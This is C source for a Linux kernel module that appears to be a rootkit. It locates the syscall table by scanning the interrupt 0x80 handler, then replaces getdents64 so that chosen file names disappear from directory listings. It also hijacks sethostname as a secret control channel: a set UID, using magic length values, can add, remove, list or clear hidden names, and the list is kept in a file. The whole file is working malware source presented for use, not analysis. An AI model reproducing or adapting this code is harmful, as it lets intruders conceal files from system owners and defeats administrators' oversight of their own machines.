
#define _KERNEL_
#include <linux/init.h>
#include <linux/limits.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/cache.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/timer.h>
#include <linux/ctype.h>
#include <linux/kernel.h>
#include <linux/file.h>
#include <linux/spinlock.h>
#include <asm/unistd.h>
#include <asm/errno.h>

#include "def.h"
#include "syscall.h"

MODULE_AUTHOR("hedgehog");
MODULE_LICENSE("Dual BSD/GPL");

static struct file *filp = NULL;
static void **hijack_sys_call_table;
static asmlinkage long (*orig_sethostname)(char *name, int len);
static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);


static struct 
{
	char *h_file[HIDE_NUM];
	rwlock_t h_rwlock;
}hide_rw;

static struct
{
    unsigned short limit;
    unsigned int base;
} __attribute__((packed)) idtr;

static struct
{
    unsigned short off_low;
    unsigned short sel;
    unsigned char none, flags;
    unsigned short off_high;
} __attribute__((packed)) idt;


/*  check if it is what we want to hide */
static int check_hide(const char *name)
{
	int i = 0;
	read_lock(&(hide_rw.h_rwlock));
	while(i < HIDE_NUM)
	{
		if (!hide_rw.h_file[i])
		{
			i++;
			continue;
		}
		if (!strcmp(name, hide_rw.h_file[i]))
		{
			//printk("find hide %s\n",hide_rw.h_file[i]);
			break;		//we cannot update from readlock to writelock! 
		}
		i++;
	}
	read_unlock(&(hide_rw.h_rwlock));
	
	if (i >= HIDE_NUM)
		return 0;
	return 1;
}

static int remove_hide(const char *name)
{
	int i = 0;
	int len;
	char *hidden = NULL;
	mm_segment_t old_fs;

	len = strlen(name);

	if (len <= 0 || len > MAX_LEN)
	  return -LENOVER;

	if (!(hidden = kmalloc(len+1, GFP_KERNEL)))
	  return -NOMEM;

	if (copy_from_user(hidden, name, len))
	  return -ACCERR;

	hidden[len] = 0;

	read_lock(&(hide_rw.h_rwlock));
	while(i < HIDE_NUM)
	{
		if (!hide_rw.h_file[i])
		{
			i++;
			continue;
		}
		if (!strcmp(hidden, hide_rw.h_file[i]))
		{
			//printk("find hide %s\n",hide_rw.h_file[i]);
			break;		//we cannot update from readlock to writelock! 
		}
		i++;
	}
	read_unlock(&(hide_rw.h_rwlock));

	/* we find nothing */
	if (i >= HIDE_NUM)
	{
		kfree(hidden);
		return -NOENT;	
	}

	write_lock(&(hide_rw.h_rwlock));
	if (!hide_rw.h_file[i])		//someone else has helped me free the item
	{
		kfree(hidden);
		write_unlock(&(hide_rw.h_rwlock));
		return NOERR;
	}

	kfree(hidden);
	kfree(hide_rw.h_file[i]);
	hide_rw.h_file[i] = NULL;
	write_unlock(&(hide_rw.h_rwlock));
	return NOERR;
}


static int insert_hide(const char *name)
{
	int i=0;
	int len;
	char *hidden = NULL;
	mm_segment_t old_fs;

	len = strlen(name);
	if(len <= 0 || len> MAX_LEN)
	  return -LENOVER;

search:
	while(i < HIDE_NUM)
	{
		if(!hide_rw.h_file[i])
		  break;
		i++;
	}
	if(i >= HIDE_NUM)
	{
		if (hidden)			//it do exist. think about it
		  kfree(hidden);
		return -SLOTFULL;
	}
		
	if (!(hidden = kmalloc(len+1, GFP_KERNEL)))
	  return -NOMEM;

	old_fs = get_fs();
	set_fs(KERNEL_DS);
	if (copy_from_user(hidden, name, len))
	  return -ACCERR;
	set_fs(old_fs);

	hidden[len] = 0;

	write_lock(&(hide_rw.h_rwlock));
	/* in case someone's stolen it */
	if (hide_rw.h_file[i])
	{
		write_unlock(&(hide_rw.h_rwlock));
		goto search;
	}
	hide_rw.h_file[i] = hidden;
	write_unlock(&(hide_rw.h_rwlock));
	//printk("now the string at %p\n",hide_rw.h_file[i]);
	return NOERR;

}


static int show_hide(char *usr_buf)
{
	int i = 0;
	int len = 0;
	char buf[BUF_SIZE];

	memset(buf, 0x0, BUF_SIZE);
	read_lock(&(hide_rw.h_rwlock));
	while(i < HIDE_NUM)
	{
		if (hide_rw.h_file[i])
		{
			strcpy(buf+len, hide_rw.h_file[i]);
			len += strlen(hide_rw.h_file[i]);
			buf[len++] = '\t';
		}
		i++;
	}
	read_unlock(&(hide_rw.h_rwlock));

	len = len > BUF_SIZE ? BUF_SIZE:len;
	copy_to_user(usr_buf, buf, len);

	return 0;
}

static int write_hide()
{
	int i = 0;
	int len = 0;
	char buf[BUF_SIZE];
	mm_segment_t old_fs;

	memset(buf, 0x0, BUF_SIZE);

	filp = filp_open(PARAM_FILE, O_RDWR | O_CREAT , 0666);
	if (IS_ERR(filp))
	{
		printk("Fatal error : Open file failed \n");
		return -NOFILE;
	}

	old_fs = get_fs();
	set_fs(KERNEL_DS);
	filp->f_op->write(filp, (char *)buf, BUF_SIZE, &filp->f_pos);
	filp->f_op->llseek(filp, 0, 0);
	set_fs(old_fs);
	
	read_lock(&(hide_rw.h_rwlock));
	while(i < HIDE_NUM)
	{
		if (hide_rw.h_file[i])
		{
			strcpy(buf+len, hide_rw.h_file[i]);
			len += strlen(hide_rw.h_file[i]);
			buf[len++] = '\n';
		}
		i++;
	}
	read_unlock(&(hide_rw.h_rwlock));
	
	len = BUF_SIZE;
	
	set_fs(KERNEL_DS);
	filp->f_op->write(filp, (char *)buf, len, &filp->f_pos);
	set_fs(old_fs);


	if (filp)
	  filp_close(filp, NULL);

	return 0;

}

static int read_hide()
{
	char buf[BUF_SIZE];
	char *p = buf;
	char *start = buf;
	char *end = &buf[BUF_SIZE-1];
	int count = 0;
	mm_segment_t old_fs;

	memset(buf, 0x0, BUF_SIZE);

	filp = filp_open(PARAM_FILE, O_RDWR | O_CREAT, 0666);
	if (IS_ERR(filp))
	{
		printk("Error occured : Cannot find the file\n");
		return -NOFILE;
	}

	old_fs = get_fs();
	set_fs(KERNEL_DS);
	filp->f_op->read(filp, (char *)buf, BUF_SIZE-1, &filp->f_pos);
	set_fs(old_fs);
	if (filp)
	  filp_close(filp, NULL);


	if (!(*p))
	{
		//printk("Message : File empty\n");		//Maybe the file is empty... So it's not a error 
		return NOERR;
	}

	while(count < HIDE_NUM)
	{
		while((p <= end) && (*p) && (*p != 10) && (*p != 13))
		{
			p++;
		}

		if(!(*p) || p > end || count >=4)
		  break;
		
		if ((*p == 10) || (*p == 13))
		{
			*p++ = 0;
			count++;
			insert_hide(start);
			while((p <= end) && (*p) && (*p == 10) && (*p == 13))
			  p++;
			start = p;
		}

	}

	return NOERR;

}

static int clear_hide()
{
	int i = 0;
	
	write_lock(&(hide_rw.h_rwlock));
	while(i<HIDE_NUM)
	{
		if (hide_rw.h_file[i])
		{
			//printk("free %d at %x\n", i, hide_rw.h_file[i]);
			kfree(hide_rw.h_file[i]);
			hide_rw.h_file[i] = NULL;
		}
		i++;
	}
	write_unlock(&(hide_rw.h_rwlock));

	return NOERR;
}



asmlinkage long hijack_sethostname(char *name, int len)
{
	int ret = 0;
	char *hidden = NULL;
	if (likely(current->uid == UID && current->euid == EUID))
	{
		switch(len)
		{
			case HIDE_FILE :
				if (!(ret = insert_hide(name)))
				 write_hide();
				break;
			case UNHIDE_FIFE :
				if (!(ret = remove_hide(name)))
					write_hide();
				break;
			case SHOW_HIDE :
				show_hide(name);
				break;
			case CLEAR_HIDE:
				clear_hide();
				write_hide();
				break;
			default:
				ret = -UNKNOWN;
				break;
		}
	
		return ret;
	}
	else
	{
		return orig_sethostname(name, len);
	}
}

asmlinkage long hijack_getdents64(unsigned int fd, struct linux_dirent64 *user_dir, unsigned int count)
{
    long ret;
    long modify_len;
    long rec_len;
    
    void *kdir_buffer = NULL;
    struct linux_dirent64 *kdir_head = NULL, *kdir_end = NULL, *kdir_pos = NULL, *kdir_prev = NULL;

    if ((ret = orig_getdents64(fd, user_dir, count)) <= 0)
        return ret;

    if (!(kdir_buffer = kmalloc(ret, GFP_KERNEL)))
        return ret;

    if (copy_from_user(kdir_buffer, user_dir, ret))
    {
        return ret;
    }

    modify_len = ret;
    kdir_head = (struct linux_dirent64 *)kdir_buffer;
    kdir_end = (struct linux_dirent64 *)(kdir_buffer + ret);
    kdir_pos = kdir_head;

    while (kdir_pos < kdir_end)
    {
        rec_len = kdir_pos->d_reclen;

        if (!rec_len)
            goto out_free;

        if (check_hide(kdir_pos->d_name))
        {
            if (!kdir_prev)
            {
                kdir_head = (struct linux_dirent64 *)(kdir_buffer+rec_len);
                modify_len -= rec_len;
            }
            else
            {
                kdir_prev->d_reclen += rec_len;
                memset((void *)kdir_pos, 0, rec_len);
            }
        }
        else
        {
            kdir_prev = kdir_pos;
        }

        kdir_pos = (struct linux_dirent64 *)((void *)kdir_pos+rec_len);
    }

    copy_to_user(user_dir, kdir_head, modify_len);

out_free:
    kfree(kdir_buffer);

    return modify_len;

}

static int get_sys_call_table(void)
{
    unsigned int sys_call_off;
    char* p;
    int i;
    // 获取中断描述符表寄存器的地址
	asm("sidt %0":"=m"(idtr));
   
    // 获取0x80中断处理程序的地址
    memcpy(&idt, idtr.base+8*0x80, sizeof(idt));
    sys_call_off=((idt.off_high<<16)|idt.off_low);
  
    // 从0x80中断服务例程中搜索sys_call_table的地址
    p=sys_call_off;
    for (i=0; i<100; i++)
    {
        if (p[i]=='\xff' && p[i+1]=='\x14' && p[i+2]=='\x85')
        {
            hijack_sys_call_table=(void **)(*(unsigned int*)(p+i+3));
            return 0;
        }
    }
    return -1;
}


static int hijack_init()
{
	int i = 0;
  
	if(HIJACK_SYS_CALL_TABLE < 0xc0000000)
		hijack_sys_call_table = (void **)get_sys_call_table();
	else
		hijack_sys_call_table = HIJACK_SYS_CALL_TABLE;


   	while(i < HIDE_NUM)
	{
		hide_rw.h_file[i] = NULL;
		i++;
	}
	hide_rw.h_rwlock = RW_LOCK_UNLOCKED;

	read_hide();

	
    orig_getdents64 = hijack_sys_call_table[__NR_getdents64];
    //printk("sys_getdents64 at %x\n", orig_getdents64);
    hijack_sys_call_table[__NR_getdents64] = hijack_getdents64;
	
	
	orig_sethostname = hijack_sys_call_table[__NR_sethostname];
	//printk("sys_sethostname at %x\n", orig_sethostname);
	hijack_sys_call_table[__NR_sethostname] = hijack_sethostname;
	

    return 0;
}

static void hijack_exit()
{
   			
	hijack_sys_call_table[__NR_sethostname] = orig_sethostname;
	hijack_sys_call_table[__NR_getdents64] = orig_getdents64;

	write_hide();
	
	clear_hide();

	return ;
}

module_init(hijack_init);
module_exit(hijack_exit);
